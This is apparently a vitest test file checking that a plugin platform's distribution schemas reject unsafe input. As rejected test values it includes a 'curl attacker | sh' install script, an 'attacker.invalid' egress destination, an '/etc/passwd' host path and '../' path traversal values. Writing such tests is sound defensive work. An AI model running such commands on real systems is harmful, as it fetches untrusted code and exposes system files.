import { describe, expect, it } from 'vitest';

import {
  getPluginCompatibilityMatrixV1JsonSchema,
  pluginAirgapIndexV1Schema,
  pluginAirgapOciLayoutMediaTypeV1,
  pluginAirgapRegistryMapV1Schema,
  pluginCatalogV1Schema,
  pluginCompatibilityMatrixV1Schema,
  pluginPackageIndexV1Schema,
  pluginResourceDescriptorV1Schema,
} from './distribution.js';

const hash = '1'.repeat(64);
const bundle = `registry.example/plugins/example@sha256:${hash}`;

describe('plugin distribution contracts', () => {
  it('accepts a bounded resource descriptor and rejects deployment code/destinations', () => {
    const descriptor = {
      apiVersion: 'resources.plugin.enterpriseglue.io/v1',
      kind: 'EnterpriseGluePluginResources',
      service: {
        containerPort: 8080,
        runAsNonRoot: true,
        readOnlyRootFilesystem: true,
        tmpfsMiB: 64,
        cpuLimit: '500m',
        memoryLimitMiB: 512,
      },
      configuration: [
        {
          name: 'SUPPORT_ENDPOINT_REF',
          source: 'deployment_config',
          reference: 'ion-support-endpoint',
          required: true,
        },
        {
          name: 'SIGNED_ENTITLEMENT',
          source: 'deployment_file',
          reference: 'ion-support-entitlement.json',
          required: true,
        },
      ],
      storage: [],
      network: {
        ingress: 'host-gateway-only',
        egressPolicy: 'ion-support-cloud',
      },
      probes: {
        healthPath: '/_plugin/health',
        readyPath: '/_plugin/ready',
        initialDelaySeconds: 5,
        periodSeconds: 10,
        timeoutSeconds: 2,
        failureThreshold: 3,
      },
    };

    expect(pluginResourceDescriptorV1Schema.safeParse(descriptor).success).toBe(
      true,
    );
    expect(
      pluginResourceDescriptorV1Schema.safeParse({
        ...descriptor,
        installScript: 'curl attacker | sh',
      }).success,
    ).toBe(false);
    expect(
      pluginResourceDescriptorV1Schema.safeParse({
        ...descriptor,
        network: {
          ...descriptor.network,
          destination: 'https://attacker.invalid',
        },
      }).success,
    ).toBe(false);
    expect(
      pluginResourceDescriptorV1Schema.safeParse({
        ...descriptor,
        configuration: [
          {
            name: 'HOST_FILE',
            source: 'deployment_file',
            reference: 'public.json',
            required: true,
            hostPath: '/etc/passwd',
          },
        ],
      }).success,
    ).toBe(false);
  });

  it('requires unique plugin/release identity and coherent revocation', () => {
    const entry = {
      pluginId: 'io.enterpriseglue.example',
      displayName: 'Example',
      publisher: 'io.enterpriseglue',
      releases: [
        {
          version: '1.0.0',
          channel: 'stable',
          bundle,
          manifestSha256: hash,
          hostCompatibility: '^0.4.0',
          testedHostVersions: ['0.4.6'],
          sdkCompatibility: '^0.1.0',
          revoked: false,
          revocationReasonCode: 'none',
        },
      ],
    };
    const catalog = {
      apiVersion: 'catalog.plugin.enterpriseglue.io/v1',
      kind: 'EnterpriseGluePluginCatalog',
      metadata: {
        revision: '1.0.0',
        generatedAt: '2026-07-24T00:00:00.000Z',
        expiresAt: '2026-08-24T00:00:00.000Z',
      },
      entries: [entry],
    };
    expect(pluginCatalogV1Schema.safeParse(catalog).success).toBe(true);
    expect(
      pluginCatalogV1Schema.safeParse({
        ...catalog,
        entries: [entry, entry],
      }).success,
    ).toBe(false);
    expect(
      pluginCatalogV1Schema.safeParse({
        ...catalog,
        entries: [
          {
            ...entry,
            releases: [
              {
                ...entry.releases[0],
                revoked: true,
                revocationReasonCode: 'none',
              },
            ],
          },
        ],
      }).success,
    ).toBe(false);
    expect(
      pluginCatalogV1Schema.safeParse({
        ...catalog,
        entries: [
          {
            ...entry,
            releases: [
              {
                ...entry.releases[0],
                testedHostVersions: ['0.4.6', '0.4.6'],
              },
            ],
          },
        ],
      }).success,
    ).toBe(false);
  });

  it('requires the exact four-cell current/previous compatibility matrix', () => {
    const matrix = {
      apiVersion: 'compatibility-matrix.plugin.enterpriseglue.io/v1',
      kind: 'EnterpriseGluePluginCompatibilityMatrix',
      metadata: {
        revision: '1.0.0',
        generatedAt: '2026-07-25T02:00:00.000Z',
      },
      pluginId: 'io.enterpriseglue.example',
      publisher: 'io.enterpriseglue',
      hostVersions: {
        current: '0.4.6',
        previous: '0.4.5',
      },
      pluginVersions: {
        current: '1.1.0',
        previous: '1.0.0',
      },
      cells: ['0.4.6', '0.4.5'].flatMap((hostVersion) =>
        ['1.1.0', '1.0.0'].map((pluginVersion, index) => ({
          hostVersion,
          pluginVersion,
          hostArtifact: `registry.example/enterpriseglue/host@sha256:${
            hostVersion === '0.4.6' ? '5'.repeat(64) : '6'.repeat(64)
          }`,
          pluginArtifact: `registry.example/plugins/example@sha256:${
            pluginVersion === '1.1.0' ? '7'.repeat(64) : '8'.repeat(64)
          }`,
          result: 'passed',
          suiteRevision: 'plugin-acceptance-v1',
          testedAt: '2026-07-25T01:00:00.000Z',
          evidenceSha256: `${hostVersion === '0.4.6' ? 'a' : 'b'}${
            index === 0 ? '1' : '2'
          }`.padEnd(64, '0'),
        })),
      ),
    };

    expect(pluginCompatibilityMatrixV1Schema.safeParse(matrix).success).toBe(
      true,
    );
    expect(
      pluginCompatibilityMatrixV1Schema.safeParse({
        ...matrix,
        cells: [matrix.cells[0], matrix.cells[0], ...matrix.cells.slice(2)],
      }).success,
    ).toBe(false);
    expect(
      pluginCompatibilityMatrixV1Schema.safeParse({
        ...matrix,
        hostVersions: { current: '0.4.6', previous: '0.4.6' },
      }).success,
    ).toBe(false);
    expect(
      pluginCompatibilityMatrixV1Schema.safeParse({
        ...matrix,
        cells: matrix.cells.map((cell, index) =>
          index === 0 ? { ...cell, result: 'failed' } : cell,
        ),
      }).success,
    ).toBe(false);
    expect(
      pluginCompatibilityMatrixV1Schema.safeParse({
        ...matrix,
        cells: matrix.cells.map((cell, index) =>
          index === 2
            ? {
                ...cell,
                hostArtifact:
                  `registry.example/enterpriseglue/host@sha256:${'9'.repeat(64)}`,
              }
            : cell,
        ),
      }).success,
    ).toBe(false);
  });

  it('exports a closed draft 2020-12 compatibility-matrix JSON Schema', () => {
    const schema = getPluginCompatibilityMatrixV1JsonSchema();

    expect(schema.$schema).toBe('https://json-schema.org/draft/2020-12/schema');
    expect(schema.$id).toContain(
      'enterpriseglue-plugin-compatibility-matrix-v1',
    );
    expect(schema.additionalProperties).toBe(false);
    expect(schema.required).toContain('cells');
  });

  it('rejects traversal and duplicate paths in an air-gap index', () => {
    const artifact = {
      source: bundle,
      archivePath: 'artifacts/example.oci.tar',
      mediaType: pluginAirgapOciLayoutMediaTypeV1,
      sizeBytes: 1024,
      sha256: hash,
    };
    const index = {
      apiVersion: 'airgap.plugin.enterpriseglue.io/v1',
      kind: 'EnterpriseGluePluginAirgapIndex',
      catalogRevision: '1.0.0',
      generatedAt: '2026-07-24T00:00:00.000Z',
      artifacts: [artifact],
    };
    expect(pluginAirgapIndexV1Schema.safeParse(index).success).toBe(true);
    expect(
      pluginAirgapIndexV1Schema.safeParse({
        ...index,
        artifacts: [{ ...artifact, archivePath: '../escape.tar' }],
      }).success,
    ).toBe(false);
    expect(
      pluginAirgapIndexV1Schema.safeParse({
        ...index,
        artifacts: [artifact, artifact],
      }).success,
    ).toBe(false);
  });

  it('requires air-gap registry mappings to preserve immutable digests', () => {
    const registryMap = {
      apiVersion: 'airgap-map.plugin.enterpriseglue.io/v1',
      kind: 'EnterpriseGluePluginAirgapRegistryMap',
      catalogRevision: '1.0.0',
      generatedAt: '2026-07-24T00:00:00.000Z',
      mappings: [
        {
          source: bundle,
          target: `registry.customer.invalid/enterpriseglue/example@sha256:${hash}`,
          archivePath: 'artifacts/example.oci.tar',
        },
      ],
    };
    expect(pluginAirgapRegistryMapV1Schema.safeParse(registryMap).success).toBe(
      true,
    );
    expect(
      pluginAirgapRegistryMapV1Schema.safeParse({
        ...registryMap,
        mappings: [
          {
            ...registryMap.mappings[0],
            target: `registry.customer.invalid/enterpriseglue/example@sha256:${'b'.repeat(64)}`,
          },
        ],
      }).success,
    ).toBe(false);
  });

  it('requires a complete, unique, traversal-safe private package inventory', () => {
    const runtimeFile = {
      path: 'plugin.yaml',
      role: 'runtime',
      sizeBytes: 1024,
      sha256: hash,
    };
    const packageIndex = {
      apiVersion: 'package.plugin.enterpriseglue.io/v1',
      kind: 'EnterpriseGluePluginPackageIndex',
      pluginId: 'io.enterpriseglue.example',
      version: '1.0.0',
      catalogRevision: '1.0.0',
      generatedAt: '2026-07-24T00:00:00.000Z',
      manifestPath: 'plugin.yaml',
      resourcesPath: 'deploy/resources.json',
      files: [
        runtimeFile,
        {
          ...runtimeFile,
          path: 'deploy/resources.json',
        },
      ],
    };
    expect(pluginPackageIndexV1Schema.safeParse(packageIndex).success).toBe(true);
    expect(
      pluginPackageIndexV1Schema.safeParse({
        ...packageIndex,
        files: [
          ...packageIndex.files,
          {
            ...runtimeFile,
            path: 'evidence/malware.json',
            role: 'malware_report',
          },
          {
            ...runtimeFile,
            path: 'evidence/secrets.json',
            role: 'secret_scan_report',
          },
        ],
      }).success,
    ).toBe(true);
    expect(
      pluginPackageIndexV1Schema.safeParse({
        ...packageIndex,
        files: [
          runtimeFile,
          { ...runtimeFile, path: '../escape.js' },
        ],
      }).success,
    ).toBe(false);
    expect(
      pluginPackageIndexV1Schema.safeParse({
        ...packageIndex,
        files: [runtimeFile, runtimeFile],
      }).success,
    ).toBe(false);
    expect(
      pluginPackageIndexV1Schema.safeParse({
        ...packageIndex,
        resourcesPath: 'evidence/sbom.json',
        files: [
          runtimeFile,
          {
            ...runtimeFile,
            path: 'evidence/sbom.json',
            role: 'sbom',
          },
        ],
      }).success,
    ).toBe(false);
  });
});
